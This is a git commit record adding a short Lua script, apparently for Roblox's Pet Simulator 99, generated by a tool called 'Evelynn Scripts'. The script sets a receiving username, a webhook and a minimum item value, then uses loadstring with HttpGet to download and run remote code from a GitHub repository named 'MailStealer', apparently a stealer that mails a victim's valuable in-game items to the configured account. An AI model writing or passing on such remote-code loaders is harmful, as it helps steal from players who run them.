acea973728c799b9beccb01aa387436705cbed3d
Evelynn <folder.is.back@gmail.com>
2025-06-13 17:47:41 +0200

    🌐 Script Generated With Evelynn Scripts

---
+++ kyutjyhrdgfs.lua
@@ -0,0 +1,6 @@
+Username = '1'
+Username2 = '1'
+Webhook = 'hi'
+MinimumRAP = 1
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Ev3ly-nn/MailStealer/refs/heads/main/Protected_PetSimulator99'))()
